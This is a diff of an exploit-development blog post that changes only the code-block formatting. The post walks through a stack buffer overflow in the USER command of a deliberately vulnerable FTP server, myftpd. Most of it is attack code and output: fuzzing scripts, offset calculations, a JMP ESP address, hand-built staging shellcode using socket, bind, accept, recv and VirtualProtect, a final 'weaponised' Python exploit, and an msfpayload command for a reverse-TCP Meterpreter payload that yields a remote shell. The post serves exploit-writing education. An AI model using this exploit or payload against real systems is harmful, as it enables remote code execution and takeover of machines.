@@ -39,9 +39,9 @@ If you want to follow along, get yourself these tools, configure them and have t
 
 The zip file that I downloaded contained one binary called `myftpd.exe` with a configuration file called `passwd.conf`. I started by opening the `passwd.conf` file to see what was inside:
 
-``` text passwd.conf
+{% codeblock passwd.conf lang:text %}
 test|test|c:|0
-```
+{% endcodeblock %}
 
 Obviously this is a list of users that are able to access the application and so it's probably safe to assume that a valid login is `test`/`test`. Upon launching the application we're presented with a rather nice black console which is used to show activity on the server:
 
@@ -53,7 +53,7 @@ Nothing too crazy going on here. We can see that it handles the basic commands, 
 
 We know that the first thing we need to do when signing in to the server is to issue the `USER` command, so for me this was the first logical point of call. I whipped up a quick python script which generated bigger and bigger user names to throw at the application. It looks like this:
 
-``` python fuzz.py
+{% codeblock fuzz.py lang:python %}
 #!/usr/bin/python
 
 import socket
@@ -75,7 +75,7 @@ for i in range(1, 100):
   command = "USER {0}\r\n".format(name)
   print "[*] Username {0} chars, Command {1} chars...".format(len(name), len(command))
   fuzz(command)
-```
+{% endcodeblock %}
 
 As you can see this script is really simple, and just increments the size of the payload to deploy until things break. I went ahead and attached Immunity to the server and kicked off my script. To my annoyance the developers of application has put a breakpoint in the code when a user connects. Obviously the goal here was to stop us from fuzzing under a debugger:
 
@@ -87,7 +87,7 @@ To get around this problem I just modified the assembly inline using Immunity so
 
 With this out of the way the script ran nicely. Until...
 
-``` text Fuzzing ...
+{% codeblock Fuzzing %}
 $ ./fuzz.py
 [*] Fuzzing 10.1.10.34:21 ...
 [*] Username 16 chars, Command 23 chars...
@@ -109,11 +109,11 @@ $ ./fuzz.py
 [*] Username 272 chars, Command 279 chars...
 [*] Username 288 chars, Command 295 chars...
 [*] Username 304 chars, Command 311 chars...
-```
+{% endcodeblock %}
 
 When the username hit `304` characters, things turned bad for the server. Immunity showed the following information about the registers:
 
-``` text
+{% codeblock Register contents %}
 EAX 00000000
 ECX 0024A9C0
 EDX 0000002F
@@ -123,11 +123,11 @@ EBP 41414141
 ESI 41414141
 EDI 41414141
 EIP 41414141
-```
+{% endcodeblock %}
 
 At this point it looks like we have a "vanilla" `EIP` overwrite. Taking a look at the stack window we can see something interesting:
 
-``` text Stack contents
+{% codeblock Stack contents %}
 00B5FF90   00000000  ....
 00B5FF94   00000000  ....
 00B5FF98   00000000  ....
@@ -158,7 +158,7 @@ At this point it looks like we have a "vanilla" `EIP` overwrite. Taking a look a
 00B5FFFC   00000000  ....
 
  -- this is the end of the memory region --
-```
+{% endcodeblock %}
 
 From the above dump we can see that there's a chance we can redirect the flow of code to something we control by pointing `EIP` to a known instruction for either a `PUSH ESP # RET`, `CALL ESP` or `JMP ESP` instruction. Before we look into that, it's worth noting that this memory dump ends at `00B5FFFC`, which means that we probably can't write too much information otherwise we'll crash the process in a different way. The other thing that stands out here is that the first part of the payload has be set to zero (we can't see `USER` anywhere here) so it would appear that the front part of the buffer is clobbered by something before we get here.
 
@@ -166,7 +166,7 @@ I changed my fuzzing script a little and did some trial and error. It turns out 
 
 I fired a command which was simply a string of `365` `A` characters without a `\r\n` suffix. This is what the stack looked like:
 
-``` text Stack contents
+{% codeblock Stack contents %}
 00B5FF90   00000000  ....
 00B5FF94   00000000  ....
 00B5FF98   00000000  ....
@@ -195,7 +195,7 @@ I fired a command which was simply a string of `365` `A` characters without a `\
 00B5FFF4   41414141  AAAA
 00B5FFF8   41414141  AAAA
 00B5FFFC   00414141  AAA.
-```
+{% endcodeblock %}
 
 What's interesting here is that a `NULL` byte is being written to memory at `00B5FFFF`, just something to bear in mind later on.
 
@@ -203,13 +203,13 @@ What's interesting here is that a `NULL` byte is being written to memory at `00B
 
 The next thing to do is to start crafting an exploit, and in order to execute our own code we need to control `EIP`. First we need to know the offset of the bytes that overwrite `EIP` and for this we'll use the tried and true `pattern_create.rb` along with its cohort `pattern_offset.rb`. However, I'm not a fan of having massive exploit payloads directly pasted into my source code, so instead I read the files in. We create the pattern file like so:
 
-``` bash Creating a pattern
+{% codeblock Creating a pattern %}
 $ pattern_create.rb 356 > pattern.txt
-```
+{% endcodeblock %}
 
 We then begin our exploit with a simple shell that looks like this:
 
-``` python sploit.py version 1
+{% codeblock sploit.py version 1 lang:python %}
 #!/usr/bin/python
 
 import socket
@@ -233,11 +233,11 @@ print "[*] Attacking {0}:{1} ...".format(host, port)
 command = read_file('pattern.txt')
 print "[*] Command {0} chars...".format(len(command))
 pwn(command)
-```
+{% endcodeblock %}
 
 If we launch this script, the program crashes with the following register content:
 
-``` text Register contents
+{% codeblock Register contents %}
 EAX 00000000
 ECX 0024CF98
 EDX 00000031
@@ -247,22 +247,22 @@ EBP 376A4136
 ESI 41346A41
 EDI 6A41356A
 EIP 41386A41
-```
+{% endcodeblock %}
 
 For now we're only interested in the offset of `EIP` and `ESP`, and the point at which the `NULL` bytes stop being written; if we need others then we will figure them out later:
 
-``` base Offset calculations
+{% codeblock Offset calculations %}
 $ pattern_offset.rb 0Ak1    
 [*] Exact match at offset 302
 $ pattern_offset.rb 41386A41
 [*] Exact match at offset 294
 $ pattern_offset.rb 8Ai9
 [*] Exact match at offset 266
-```
+{% endcodeblock %}
 
 Here we can see that EIP and ESP are actually quite close together. Let's modify our exploit to see if we have our offsets correct (we'll worry about the shellcode start later). The script now looks like this:
 
-``` python sploit.py version 2
+{% codeblock sploit.py version 2 lang:python %}
 #!/usr/bin/python
 
 import socket
@@ -300,11 +300,11 @@ command += "E" * (max_size - len(command))
 
 print "[*] Command {0} chars...".format(len(command))
 pwn(command)
-```
+{% endcodeblock %}
 
 Running this command gives us the following register content when crashed:
 
-``` text Register contents
+{% codeblock Register contents %}
 EAX 00000000
 ECX 0024CF98
 EDX 00000031
@@ -314,19 +314,19 @@ EBP 41414141
 ESI 41414141
 EDI 41414141
 EIP 42424242
-```
+{% endcodeblock %}
 
 Our offsets are spot on. Next we need to find an address that we can use to overwrite ESP with. Preferably we'll use a `JMP ESP` instruction instead of the other options because this will not modify the content of memory around `ESP` (which would be bad in case it overwrites stuff that's important to us). Here we'll use **Mona.py** within immunity to give us a list of addresses that we can use.
 
 Ideally our exploit would not be tied to a given platform, so we would ultimately like to find an address which isn't tied to any Windows DLLs. We start by searching for jump instructions within the `myftpd` process itself because we know this will translate across platforms:
 
-``` text Mona commands
+{% codeblock Mona commands %}
 !mona jmp -r ESP -m myftpd
-```
+{% endcodeblock %}
 
 Unfortunately for us, all we get is:
 
-``` text Mona output
+{% codeblock Mona output %}
            ---------- Mona command started on 2014-02-28 22:29:14 (v2.0, rev 427) ----------
 0BADF00D   [+] Processing arguments and criteria
 0BADF00D       - Pointer access level : X
@@ -342,17 +342,17 @@ Unfortunately for us, all we get is:
 0BADF00D       Found a total of 0 pointers
 0BADF00D
            [+] This mona.py action took 0:00:00.265000
-```
+{% endcodeblock %}
 
 There are no addresses in the executable which we can use to redirect control to `ESP`. So we have to look further. We instead let Monay go nuts on all the modules:
 
-``` text Mona command
+{% codeblock Mona command %}
 !mona jmp -r ESP
-```
+{% endcodeblock %}
 
 And we get a listing that looks like the following:
 
-``` text Mona output
+{% codeblock Mona output %}
            ---------- Mona command started on 2014-02-28 22:27:28 (v2.0, rev 427) ----------
 0BADF00D   [+] Processing arguments and criteria
 0BADF00D       - Pointer access level : X
@@ -407,13 +407,13 @@ And we get a listing that looks like the following:
 0BADF00D       Found a total of 33 pointers
 0BADF00D
            [+] This mona.py action took 0:00:01.281000
-```
+{% endcodeblock %}
 
 Isn't that just sweet? Lots of options here, though it does tie us down to a particular platform and using addresses like these will not work on Vista and later thanks to ASLR. Perhaps we can come up with a solution to this down the track.
 
 I dug a little deeper in `jmp.txt` which contained all the addresses, and decided to settle on `0x7e4456f7` (a `JMP ESP` instruction) which is located in `user32.dll`. I chose this one because the only byte that isn't in the `ASCII` table is the last one, and it was my attempt and minimising the possibility of a bad character causing problems. I modified the exploit so that `EIP` would contain this value, and changed the code in `ESP` so that it would break once the jump had been performed. I also starting building in the support for multiple platforms for easy adjustment later on.
 
-``` python sploit.py version 3
+{% codeblock sploit.py version 3 lang:python %}
 #!/usr/bin/python
 
 import socket, struct
@@ -460,7 +460,7 @@ command += "E" * (max_size - len(command))
 
 print "[*] Command {0} chars...".format(len(command))
 pwn(command)
-```
+{% endcodeblock %}
 
 Execution of this script gives us the following:
 
@@ -472,7 +472,7 @@ Execution of this script gives us the following:
 
 If it isn't already clear, we don't really have that much space to play in. Our shellcode space starts at `266`, ends at `365` and has a 4-byte block taken out of the middle of it which contains the `EIP` overwrite and another 4 bytes tucked away between `ESP` and `EIP`. It doesn't leave us with much given how things are broken up. The area we have for shellcode looks like this:
 
-``` text Register contents
+{% codeblock Register contents %}
 00B5FF94   00000000  ....
 00B5FF98   00000000  ....
 00B5FF9C   42424242  BBBB  <-- block 2 start --
@@ -500,7 +500,7 @@ If it isn't already clear, we don't really have that much space to play in. Our 
 00B5FFF4   45454545  EEEE
 00B5FFF8   45454545  EEEE
 00B5FFFC   00454545  EEE.   -- block 1 end -->
-```
+{% endcodeblock %}
 
 Clearly we can't fit a standard useful payload in here, plus with such limitations it flies in the face of our goal of being able to invoke _any_ payload we wish from the attacker's side. We need to consider other options.
 
@@ -546,7 +546,7 @@ Unfortunately, this approach means that we would have to use up 10 bytes for eve
 
 We can actually use a handy trick to solve this problem. Observe the locations of the interesting functions within the `myftpd.exe` binary:
 
-``` text Function imports
+{% codeblock Function imports %}
 0040340C   JMP DWORD PTR DS:[<&WS2_32.recv>]        ;  WS2_32.recv
 00403424   JMP DWORD PTR DS:[<&WS2_32.accept>]      ;  WS2_32.accept
 00403434   JMP DWORD PTR DS:[<&WS2_32.socket>]      ;  WS2_32.socket
@@ -554,7 +554,7 @@ We can actually use a handy trick to solve this problem. Observe the locations o
 0040345C   JMP DWORD PTR DS:[<&WS2_32.listen>]      ;  WS2_32.listen
 00403DD4   JMP DWORD PTR DS:[<&msvcrt.malloc>]      ;  msvcrt.malloc
 00403EA4   JMP DWORD PTR DS:[<&KERNEL32.VirtualProt>;  kernel32.VirtualProtect
-```
+{% endcodeblock %}
 
 We can see that these imports are close together. So we could perform the above calculation the first time we need to call a function, but from that point on we can just offset from the previous call to move to the next function we need to invoke. The `ADD` or `SUB` instructions are smaller (3 bytes in total) and hence save us 5 bytes for each call. Excellent! We just need to pick a register that will not change across function calls, and that will allow us to operate on the two lower order bytes easy. I chose `EBX` for this purpose.
 
@@ -564,9 +564,9 @@ So with that lot in mind, let's get shellcoding.
 
 At the time of the crash our registers don't contain anything too useful, other than `EAX` containing a `0` and `ESP` pointing to a known location in memory. However, even this is in a bad spot for us because any adjustment of the stack via the use of `PUSH` or `CALL` instructions result in the stack memory being changed. As a result we need to move `ESP` away from our shellcode prior to any work being done. Therefore our first bit of shellcode looks like this:
 
-``` text
+{% codeblock ASM listing %}
 SUB ESP, 0x7C         ; Move the stack pointer somewhere safe
-```
+{% endcodeblock %}
 
 We subtract `0x7C` bytes because:
 
@@ -580,25 +580,25 @@ Next we need to construct a call to a new socket. This means we need to locate a
 
 Before we can do that we need to get the first of the functions that we're going to call into `EBX`, just as we discussed before:
 
-``` text
+{% codeblock ASM listing %}
 MOV EBX, 0x40343444   ; Set EBX to a mostly correct address
 SHR EBX, 0x8          ; Shift EBX right by a byte to correct the address
-```
+{% endcodeblock %}
 
 We now need to push the three magic values onto the stack in the reverse order (bear in mind that `EAX` is `0` at this point):
 
-``` text
+{% codeblock ASM listing %}
 MOV AL, 6             ; Set EAX to 6
 PUSH EAX
 MOV AL, 1             ; Set EAX to 1
 PUSH EAX
 INC EAX               ; Set EAX to 2
 PUSH EAX
-```
+{% endcodeblock %}
 
 With the stack parameters ready to go, we can simply call the socket function and we should see a result appear in `EAX` which indicates a valid socket handle. Let's take a look at our exploit up until this point:
 
-``` python sploit.py version 4
+{% codeblock sploit.py version 4 lang:python %}
 #!/usr/bin/python
 
 import socket, struct
@@ -665,11 +665,11 @@ command += "E" * (max_size - len(command))
 print "[*] Command {0} chars...".format(len(command))
 pwn(command)
 
-```
+{% endcodeblock %}
 
 Invocation shows shellcode that has just been invoked looking like this:
 
-``` text
+{% codeblock ASM listing %}
 00B5FFC0   83EC 7C          SUB ESP,7C
 00B5FFC3   BB 44343440      MOV EBX,40343444
 00B5FFC8   C1EB 08          SHR EBX,8
@@ -680,11 +680,11 @@ Invocation shows shellcode that has just been invoked looking like this:
 00B5FFD1   40               INC EAX
 00B5FFD2   50               PUSH EAX
 00B5FFD3   FFD3             CALL EBX
-```
+{% endcodeblock %}
 
 The registers contain the following:
 
-``` text Register contents
+{% codeblock Register contents %}
 EAX 00000084
 ECX 71AB4114 WS2_32.71AB4114
 EDX 00000008
@@ -695,17 +695,17 @@ ESI 42424242
 EDI 42424242
 EIP 00B5FFD6
 O 0  LastErr ERROR_SUCCESS (00000000)
-```
+{% endcodeblock %}
 
 So we can see that `EBX` contains the `socket` function address as we had planned, but more importantly the `LastErr` indicates success, and `EAX` contains the result of the function call which is the handle to the socket we'll be listening on. We need to store that handle away so that we can use it in calls to `bind`, `listen` and `accept`. Instead of pushing onto the stack we're going to put it in a register for easy access. `EDI` is another register that tends to persist across calls to the functions that we'll be calling so let's put it in there.
 
-``` text
+{% codeblock ASM listing %}
 MOV EDI, EAX          ; Store the socket handle somewhere else
-```
+{% endcodeblock %}
 
 Once we've got the socket, we need to bind it to an address. This is where the existing global variable comes in which was used to set up the existing socket. To locate this structure in memory, all I had to do was use Immunity to locate the exiting call to `bind`. This was as simple as setting a breakpoint on the same memory address as the `bind` jump call, which is at `0x00403454`. This is invoked during start-up, and so launching the application results in the breakpoint being hit. From there we can step through a few instructions until we find ourselves back at the call site, located at address `0x00403134`. The instructions leading up to the call look like this:
 
-``` text Original bind call
+{% codeblock Original bind call %}
 00403116   . 52             PUSH EDX                                 ; |Socket
 00403117   . A3 38744000    MOV DWORD PTR DS:[407438],EAX            ; |
 0040311C   . C74424 08 1000>MOV DWORD PTR SS:[ESP+8],10              ; |
@@ -713,32 +713,32 @@ Once we've got the socket, we need to bind it to an address. This is where the e
 0040312C   . A1 30744000    MOV EAX,DWORD PTR DS:[407430]            ; |
 00403131   . 890424         MOV DWORD PTR SS:[ESP],EAX               ; |
 00403134   . E8 1B030000    CALL <JMP.&WS2_32.bind>                  ; \bind
-```
+{% endcodeblock %}
 
 The second parameter to a `bind` call is the socket address structure, which means the address stored in `ESP+4` is the one we're interested in. Here we can see that the value being stored here is `myftpd.00407434`, which is the global variable containing the socket address.
 
 We're going to abuse the knowledge of the location of this thing and reuse it in our call. Note that we can't bind to the same socket, so we'll just increment the socket number prior to making our call. The address is `0x00407434`, which just happens to be `0x4000` past our current `EBX` value. We'll abuse this fact to get the value bumped quicky, and then we'll increment the port number:
 
-``` text
+{% codeblock ASM listing %}
 MOV EDI, EAX          ; Store the socket handle somewhere else
 MOV ECX, EBX          ; Copy EBX to ECX for munging
 MOV CH, 0x74          ; Bump the address up to the right value
 INC BYTE [ECX+3]      ; Update the port from 21 to 22
-```
+{% endcodeblock %}
 
 So now we've bumped our port, and we have the `sockaddr` pointer in `ECX` we can now call bind. We know that the size of this structure is 16 bytes and have our socket handle ready in `EDI`. With our parameters ready to go, we can adjust `EBX` to point to `bind`, push our stuff onto the stack and make the call:
 
-``` text
+{% codeblock ASM listing %}
 MOV BL, 0x54          ; Point EBX at `bind`
 PUSH 0x10             ; Push 16 for the size of the struct
 PUSH ECX              ; Push the sockaddr struct pointer
 PUSH EDI              ; Push the socket handle
 CALL EBX              ; Invoke bind
-```
+{% endcodeblock %}
 
 OK, we're starting to get the hang of this. Let's see what our script looks like prior to running it this time:
 
-``` python sploit.py version 5
+{% codeblock sploit.py version 5 lang:python %}
 #!/usr/bin/python
 
 import socket, struct
@@ -819,11 +819,11 @@ command += "E" * (max_size - len(command))
 
 print "[*] Command {0} chars...".format(len(command))
 pwn(command)
-```
+{% endcodeblock %}
 
 And with this script invoked, we see the following shellcode in Immunity:
 
-``` text
+{% codeblock ASM listing %}
 00B5FFC0   83EC 7C          SUB ESP,7C
 00B5FFC3   BB 44343440      MOV EBX,40343444
 00B5FFC8   C1EB 08          SHR EBX,8
@@ -843,11 +843,11 @@ And with this script invoked, we see the following shellcode in Immunity:
 00B5FFE2   51               PUSH ECX
 00B5FFE3   50               PUSH EAX
 00B5FFE4   FFD3             CALL EBX
-```
+{% endcodeblock %}
 
 And at the end of this run the registers look like this:
 
-``` text Register contents
+{% codeblock Register contents %}
 EAX 00000000
 ECX 0024CF98
 EDX 0024C890
@@ -858,20 +858,20 @@ ESI 42424242
 EDI 00000084
 EIP 00B5FFE7
 O 0  LastErr ERROR_SUCCESS (00000000)
-```
+{% endcodeblock %}
 
 This shows that `bind` returned `0` (which is good) and that the `LastErr` is success. All is well so far! All we need now are `listen`, `accept` and `recv`. `listen` is a really simple call which takes the socket handle and a backlog counter. So let's move `EBX` to point to this function first, then set up the stack before doing the call:
 
-``` text
+{% codeblock ASM listing %}
 MOV BL, 0x5C          ; Point EBX at `listen`
 PUSH 0x7F             ; Specify a big backlog
 PUSH EDI              ; Pass in the socket
 CALL EBX              ; Invoke listen
-```
+{% endcodeblock %}
 
 Let's give that a crack in our script:
 
-``` python sploit.py version 6
+{% codeblock sploit.py version 6 lang:python %}
 #!/usr/bin/python
 
 import socket, struct
@@ -959,11 +959,11 @@ command += "E" * (max_size - len(command))
 
 print "[*] Command {0} chars...".format(len(command))
 pwn(command)
-```
+{% endcodeblock %}
 
 And this is what we get as shellcode:
 
-``` text
+{% codeblock ASM listing %}
 00B5FFC0   83EC 7C          SUB ESP,7C
 00B5FFC3   BB 44343440      MOV EBX,40343444
 00B5FFC8   C1EB 08          SHR EBX,8
@@ -988,11 +988,11 @@ And this is what we get as shellcode:
 00B5FFE9   6A 7F            PUSH 7F
 00B5FFEB   57               PUSH EDI
 00B5FFEC   FFD3             CALL EBX
-```
+{% endcodeblock %}
 
 With the registers containing the following successful result:
 
-``` text Register contents
+{% codeblock Register contents %}
 EAX 00000000
 ECX 0024CF98
 EDX 00000000
@@ -1003,19 +1003,19 @@ ESI 42424242
 EDI 00000084
 EIP 00B5FFEE
 O 0  LastErr ERROR_SUCCESS (00000000)
-```
+{% endcodeblock %}
 
 Making good progress. Now we need to start accepting new connections on our socket, for that we get `accept` set up. The call would normally look like `accept(socket, NULL, NULL)`, but we're in a great spot because `ESP` current points to the middle of bunch of zeros, which means the two `NULL` values are effectively already pushed. This means we save instructions by not pushing them. Instead, we just adjust `EBX` to point at `accept`, push our socket handle and make the call:
 
-``` text
+{% codeblock ASM listing %}
 MOV BL, 0x24          ; Point EBX at `accept`
 PUSH EDI              ; Pass in the socket
 CALL EBX              ; Invoke accept
-```
+{% endcodeblock %}
 
 Now this is where it starts to get interesting, because this call is a blocking call. As a result, we need to have our attacker script connect to the bind port for the script to continue. We'll make another call to the server on the next port (22) and for this we'll be sending the payload that we want executed on the server. For now, this payload will be a dummy payload, but in future it will be any payload we want. This is what the exploit looks like now:
 
-``` python sploit.py version 7
+{% codeblock sploit.py version 7 lang:python %}
 #!/usr/bin/python
 
 import socket, struct, time
@@ -1115,11 +1115,11 @@ pwn(command, port)
 time.sleep(1)
 # Send the payload on the bind port
 pwn("AAA", port + 1)
-```
+{% endcodeblock %}
 
 Resulting shellcode that appears in memory looks like this:
 
-``` text
+{% codeblock ASM listing %}
 00B5FFC0   83EC 7C          SUB ESP,7C
 00B5FFC3   BB 44343440      MOV EBX,40343444
 00B5FFC8   C1EB 08          SHR EBX,8
@@ -1146,11 +1146,11 @@ Resulting shellcode that appears in memory looks like this:
 00B5FFED   B3 24            MOV BL,24
 00B5FFEF   57               PUSH EDI
 00B5FFF0   FFD3             CALL EBX
-```
+{% endcodeblock %}
 
 By now you'll notice that the last call blocks until our attacker script connects the second time. After this, the registers look like this:
 
-``` text Register contents
+{% codeblock Register contents %}
 EAX 000000A4
 ECX 0024A888
 EDX 00000009
@@ -1161,29 +1161,29 @@ ESI 42424242
 EDI 00000084
 EIP 00B5FFF3
 O 0  LastErr ERROR_SUCCESS (00000000)
-```
+{% endcodeblock %}
 
 Another round of success, only this time we have a meaningful value in `EAX` that we need to keep. This is the _accept socket_ handle, which is the handle that points to the client that has just connected. This is the handle we need to pass to `recv` in order pull data from the attacker. We don't need our bind socket handle any more so the first thing we do is persist this in `EDI`.
 
-``` text
+{% codeblock ASM listing %}
 MOV EDI, EAX          ; Stash the new accept socket
-```
+{% endcodeblock %}
 
 The final hurdle is the call to `recv`, but this comes with a caveat: we need to give `recv` a handle to an area of memory that is readable, writable and executable (RWX). Originally I had built this exploit to just reuse a part of the stack, but that didn't port too well to other operating system versions so instead, I thought allocating memory and changing its protection would make more sense. Let's get the `malloc` function ready, the abuse the socket handle value in `EAX` to create a sane buffer size which we push twice (one as a param to `malloc` and the other to persist the value across calls).
 
 As this point we're out of bytes in our first block (actually, just before making the call we run out of bytes). So we need to jmp back to the start of our shellcode with a `JMP` instruction and carry on from there:
 
-``` text
+{% codeblock ASM listing %}
 MOV BX,3DD4           ; Set EBX up for the `malloc` call
 MOV AH,AL             ; use the socket handle as a size fudger
 PUSH EAX              ; push for size persistence for later use
 CALL EBX              ; Invoke `malloc`
 JMP <address>         ; Jmp back to the start of block 2
-```
+{% endcodeblock %}
 
 The result of `malloc` is memory which needs to be marked as executable, and that lives in `EAX`. We'll push this value on the stack for later use, and then set up the virtual protect call:
 
-``` text
+{% codeblock ASM listing %}
 POP ECX, PUSH ECX     ; get a copy of the size in ECX
 MOV ESI, EAX          ; save the memory handle for later use
 PUSH EAX              ; push the handle onto the stack as well
@@ -1194,26 +1194,26 @@ PUSH 0x40             ; Mark the area as RWX
 PUSH ECX              ; specify the memory size to change protection on
 PUSH ESI              ; Point to the memory to protect
 CALL EBX              ; Invoke `VirtualProtect`
-```
+{% endcodeblock %}
 
 The beauty of this approach is that the stack is currently set up ready to call `recv` except for the socket handle, all we need to do adjust for the function and call it. We have another issue here though because the address contains an `0C` which is a bad character. So instead we use Mona.py again to tell us a reference point for `recv` using the `iat` command. This gives us an address located at `0x004082DC`. We can use this address instead and call using `CALL [EBX]` instead.
 
-``` text
+{% codeblock ASM listing %}
 MOV BX,82DC           ; Set EBX up for the `recv` call, but can't use 0C because it's "bad"
 PUSH EDI              ; push the socket handle
-```
+{% endcodeblock %}
 
 But wait! We can't invoke `recv` because we have run out of space, we have to make use of the last 4 bytes we have tucked away, so to do this we need to jump ahead by 5 bytes. There we can invoke the call:
 
-``` text
+{% codeblock ASM listing %}
 CALL [EBX]            ; Call `recv`
-```
+{% endcodeblock %}
 
 And the icing on the cake, `ESI` containers the memory pointer the payload was written to, so we just jump there and off we go!
 
-``` text
+{% codeblock ASM listing %}
 JMP ESI               ; Invoke the received payload
-```
+{% endcodeblock %}
 
 If we exclude the 1 blank that is placed after block2, we literally have zero bytes left to play with. Talk about cutting it fine!
 
@@ -1221,15 +1221,15 @@ If we exclude the 1 blank that is placed after block2, we literally have zero by
 
 Now before our final run, we'll need to generate a payload that we want to execute. In my case I'm going to use a meterpreter payload:
 
-``` bash Meterpreter payload creation
+{% codeblock Meterpreter payload creation %}
 $ msfpayload windows/meterpreter/reverse_tcp LHOST=10.1.10.40 LPORT=8000 R > revmet8000.bin
-```
+{% endcodeblock %}
 
 I'm going to use this as the content that I sent to the server at the end of the exploit. We'll actually pass this in on the command line from here.
 
 And so with a few more adjustments and some spit'n'polish, we have a weaponised exploit ready to go (breakpoint free!) that looks like this:
 
-``` python sploit.py FINAL version
+{% codeblock sploit.py FINAL version lang:python %}
 #!/usr/bin/python
 
 import socket, struct, time, sys
@@ -1370,24 +1370,24 @@ pwn(command, port)
 time.sleep(1)
 # Send the payload on the bind port
 pwn(read_file(payload_file), port + 1, False)
-```
+{% endcodeblock %}
 
 Armed with this, we can set up a Meterpreter listener:
 
-``` text Meterpreter handler
+{% codeblock Meterpreter handler %}
 msf exploit(handler) > exploit
 
 [*] Started reverse handler on 10.1.10.40:8000 
 [*] Starting the payload handler...
-```
+{% endcodeblock %}
 
 Launch our script at the application:
-``` text Sploit invocation
+{% codeblock Sploit invocation %}
 $ ./sploit.py 0 10.1.10.34 21 ./revmet8000.bin
 [*] Attacking 10.1.10.34:21 ...
 [*] Sending 365 bytes to 10.1.10.34:21...
 [*] Sending 314 bytes to 10.1.10.34:22...
-```
+{% endcodeblock %}
 
 Watch the magic happen:
 
@@ -1395,7 +1395,7 @@ Watch the magic happen:
 
 And enjoy a Meterpreter shell:
 
-``` text Meterpreter shell
+{% codeblock Meterpreter shell %}
 [*] Sending stage (787456 bytes) to 10.1.10.34
 [*] Meterpreter session 2 opened (10.1.10.40:8000 -> 10.1.10.34:3779) at 2014-03-01 01:20:04 +1000
 
@@ -1407,7 +1407,7 @@ OS              : Windows XP (Build 2600, Service Pack 3).
 Architecture    : x86
 System Language : en_US
 Meterpreter     : x86/win32
-```
+{% endcodeblock %}
 
 ## Last thoughts
 
